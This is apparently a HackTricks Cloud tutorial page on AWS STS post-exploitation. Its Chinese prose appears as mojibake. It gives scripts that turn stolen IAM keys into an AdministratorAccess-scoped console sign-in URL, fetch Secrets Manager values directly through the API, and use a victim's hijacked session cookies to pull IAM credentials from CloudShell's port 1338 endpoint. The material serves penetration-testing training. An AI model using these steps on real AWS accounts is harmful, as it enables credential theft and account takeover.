# AWS - STS åæœŸåˆ©ç”¨

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## STS

æ›´å¤šä¿¡æ¯ï¼š

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

#### æ–°æ–¹æ³• 2024å¹´12æœˆï¼šç»•è¿‡ Web æ§åˆ¶å°é“¾æ¥çš„è¦æ±‚ï¼Œé€šè¿‡ HTTPS POST è¯·æ±‚ç›´æ¥è·å– SecretsManager API çš„ç§˜å¯†ï¼ˆæ— éœ€ç™»å½•é“¾æ¥æˆ– Web æ§åˆ¶å°ï¼‰

æ˜¨å¤©æäº¤ï¼Œä½œä¸ºå³å°†åˆ°æ¥çš„è€ƒè¯• (ARTE: ex16x41) çš„ PRï¼Œä½†æˆ‘çœ‹åˆ° PR æ²¡æœ‰æ˜¾ç¤ºï¼Œå¯èƒ½æäº¤é”™è¯¯ï¼Œè®©æˆ‘ä»¬å†è¯•ä¸€æ¬¡ï¼š
ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œæ‚¨å®Œå…¨ç»•è¿‡äº†æ‰“å¼€ä»»ä½• URLã€æ ¼å¼åŒ–ä»»ä½•ç™»å½•é“¾æ¥æˆ–ç”šè‡³ä½¿ç”¨ CLI / Web æ§åˆ¶å°çš„è¦æ±‚ã€‚
é‚£ä¹ˆæˆ‘ä»¬åœ¨è¿™é‡Œåšäº†ä»€ä¹ˆï¼Ÿ
æˆ‘ç¼–å†™äº†è¿™ä¸ªä¸ AWS Secrets Manager API ç›´æ¥äº¤äº’çš„è„šæœ¬ï¼Œç»å¯¹ç®€å•æ˜äº†ã€‚
å½“æ‚¨è¿è¡Œè„šæœ¬æ—¶ï¼Œå®ƒä¼šå‘ AWS Secrets Manager ç«¯ç‚¹å‘é€ HTTPS POST è¯·æ±‚
https://secretsmanager.<region>.amazonaws.com/
GetSecretValue è¯·æ±‚ä½œä¸º POST è¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€ï¼Œä½¿ç”¨ SigV4 ç­¾åè¿›è¡Œèº«ä»½éªŒè¯ï¼ˆç”± boto3 ç®¡ç†ï¼‰ã€‚
Secrets Manager å¤„ç†è¯·æ±‚ï¼š
AWS æ ¹æ®é™„åŠ åˆ°æ‚¨çš„ç”¨æˆ·æˆ–è§’è‰²çš„ IAM ç­–ç•¥éªŒè¯è¯·æ±‚ï¼ˆæ­£å¦‚æˆ‘ä»¬æ‰€çŸ¥ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡ Web æ§åˆ¶å°æŸ¥çœ‹ç§˜å¯†å€¼ï¼‰
å¦‚æœå…è®¸ï¼ŒSecrets Manager æœåŠ¡å°†åœ¨å“åº”ä¸­è¿”å›è¯·æ±‚çš„ç§˜å¯†å€¼ã€‚
**POC æ¼”ç¤ºï¼š**
è·å–ç§˜å¯†å€¼çš„ CLI AWS å‘½ä»¤æ— æ³•å·¥ä½œï¼Œå› ä¸ºè®¿é—®è¢«æ‹’ç» ->
ç„¶è€Œï¼Œåœ¨å›¾åƒä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°é€šè¿‡çŸ¥é“ç§˜å¯† ID ç›´æ¥æå–æ ‡å¿—çš„æ–¹æ³•çš„ç®€å•æ€§ï¼ˆè¿™æ˜¯æˆ‘ä»¬åœ¨ç™»å½•ç”¨æˆ·é…ç½®æ–‡ä»¶æ—¶åœ¨æ—©æœŸé˜¶æ®µæšä¸¾çš„ï¼‰
![image](https://github.com/user-attachments/assets/d05a1a96-04c0-4404-b4bd-dbfa93c6494b)
æ³¨æ„ï¼šæˆ‘è®¤ä¸ºæ­¤æ–¹æ³•å¯ä»¥æ ¹æ®ç­–ç•¥çš„å…è®¸æƒ…å†µæ™®éä½¿ç”¨ï¼ˆä½†ç»•è¿‡ä¸å…è®¸é€šè¿‡ CLI çš„ç­–ç•¥é™åˆ¶ï¼‰
å› æ­¤ï¼Œåªè¦ç­–ç•¥å…è®¸ï¼ˆä½œä¸ºæ›¿ä»£æµ‹è¯•é€‰é¡¹ï¼‰ï¼Œå°±å¯ä»¥éšæ—¶ä½¿ç”¨ã€‚
é™„æ³¨ï¼šå¯¹æ‚¨å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ç›´æ¥ä¸æœåŠ¡ API äº¤äº’çš„æ–¹æ³•åº”ç”¨çš„å…¶ä»–æŠ€æœ¯æ„Ÿåˆ°å¥½å¥‡ï¼Œç°åœ¨ AWS CLIï¼Œé€‚ç”¨äºä»»ä½•ç‰¹æƒæå‡æˆ–åæœŸåˆ©ç”¨çš„è¿‡ç¨‹ï¼Œå¦‚æ­¤å¤„æ‰€ç¤ºã€‚
**ä»£ç ï¼š**
'''
Python
import boto3

session = boto3.Session(profile_name="lab6")
client = session.client("secretsmanager", region_name="us-east-1")

# è®¾ç½®è‡ªå®šä¹‰ User-Agent
client.meta.events.register(
'before-call.secretsmanager.GetSecretValue',
lambda params, **kwargs: params['headers'].update({'User-Agent': 'my-custom-tool'})
)

# é€šè¿‡ secretsmanager API ç›´æ¥æ£€ç´¢ç§˜å¯†å€¼
response = client.get_secret_value(SecretId="flag_sts_lab_3")
print(response['SecretString'])
'''

### ä» IAM å‡­è¯åˆ°æ§åˆ¶å°

å¦‚æœæ‚¨æˆåŠŸè·å–äº†ä¸€äº› IAM å‡­è¯ï¼Œæ‚¨å¯èƒ½ä¼šå¯¹ **è®¿é—® Web æ§åˆ¶å°** æ„Ÿå…´è¶£ï¼Œä½¿ç”¨ä»¥ä¸‹å·¥å…·ã€‚\
è¯·æ³¨æ„ï¼Œç”¨æˆ·/è§’è‰²å¿…é¡»å…·æœ‰æƒé™ **`sts:GetFederationToken`**ã€‚

#### è‡ªå®šä¹‰è„šæœ¬

ä»¥ä¸‹è„šæœ¬å°†ä½¿ç”¨é»˜è®¤é…ç½®æ–‡ä»¶å’Œé»˜è®¤ AWS ä½ç½®ï¼ˆéæ”¿åºœå’Œéä¸­å›½ï¼‰ä¸ºæ‚¨æä¾›ä¸€ä¸ªå¯ä»¥ç”¨æ¥ç™»å½• Web æ§åˆ¶å°çš„ç­¾å URLï¼š

{% code overflow="wrap" %}
```bash
# Get federated creds (you must indicate a policy or they won't have any perms)
## Even if you don't have Admin access you can indicate that policy to make sure you get all your privileges
## Don't forget to use [--profile <prof_name>] in the first line if you need to
output=$(aws sts get-federation-token --name consoler --policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess)

if [ $? -ne 0 ]; then
echo "The command 'aws sts get-federation-token --name consoler' failed with exit status $status"
exit $status
fi

# Parse the output
session_id=$(echo $output | jq -r '.Credentials.AccessKeyId')
session_key=$(echo $output | jq -r '.Credentials.SecretAccessKey')
session_token=$(echo $output | jq -r '.Credentials.SessionToken')

# Construct the JSON credentials string
json_creds=$(echo -n "{\"sessionId\":\"$session_id\",\"sessionKey\":\"$session_key\",\"sessionToken\":\"$session_token\"}")

# Define the AWS federation endpoint
federation_endpoint="https://signin.aws.amazon.com/federation"

# Make the HTTP request to get the sign-in token
resp=$(curl -s "$federation_endpoint" \
--get \
--data-urlencode "Action=getSigninToken" \
--data-urlencode "SessionDuration=43200" \
--data-urlencode "Session=$json_creds"
)
signin_token=$(echo -n $resp | jq -r '.SigninToken' | tr -d '\n' | jq -sRr @uri)



# Give the URL to login
echo -n "https://signin.aws.amazon.com/federation?Action=login&Issuer=example.com&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&SigninToken=$signin_token"
```
{% endcode %}

#### aws\_consoler

æ‚¨å¯ä»¥ä½¿ç”¨ [https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler) **ç”Ÿæˆä¸€ä¸ªç½‘ç»œæ§åˆ¶å°é“¾æ¥**ã€‚
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
{% hint style="warning" %}
ç¡®ä¿ IAM ç”¨æˆ·å…·æœ‰ `sts:GetFederationToken` æƒé™ï¼Œæˆ–æä¾›ä¸€ä¸ªè§’è‰²ä»¥è¿›è¡Œå‡è®¾ã€‚
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) æ˜¯ä¸€ä¸ªåœ¨å¼€å‘ç¯å¢ƒä¸­å®‰å…¨å­˜å‚¨å’Œè®¿é—® AWS å‡­è¯çš„å·¥å…·ã€‚
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
{% hint style="info" %}
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ **aws-vault** æ¥è·å– **æµè§ˆå™¨æ§åˆ¶å°ä¼šè¯**
{% endhint %}

#### ä»æ§åˆ¶å°åˆ° IAM å‡­è¯

[**æœ€åˆåœ¨è¿™ç¯‡æ–‡ç« ä¸­å‘ç°**](https://blog.christophetd.fr/retrieving-aws-security-credentials-from-the-aws-console/)ï¼Œå¦‚æœæ‚¨è®¾æ³•è·å–äº†å¯¹ web æ§åˆ¶å°çš„æŸäº›è®¿é—®æƒé™ï¼ˆä¹Ÿè®¸æ‚¨çªƒå–äº† cookies å¹¶æ— æ³•è®¿é—® .aws æ–‡ä»¶å¤¹ï¼‰ï¼Œæ‚¨å¯ä»¥é€šè¿‡ **CloudShell** è·å–è¯¥ç”¨æˆ·çš„ä¸€äº› IAM ä»¤ç‰Œå‡­è¯ã€‚

CloudShell é€šè¿‡ **æœªè®°å½•çš„ç«¯ç‚¹åœ¨ 1338 ç«¯å£** æš´éœ² IAM å‡­è¯ã€‚åœ¨å°†å—å®³è€…çš„ä¼šè¯ cookies åŠ è½½åˆ°æ‚¨çš„æµè§ˆå™¨åï¼Œæ‚¨å¯ä»¥å¯¼èˆªåˆ° CloudShell å¹¶å‘å‡ºä»¥ä¸‹å‘½ä»¤ä»¥è·å– IAM å‡­è¯ã€‚
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
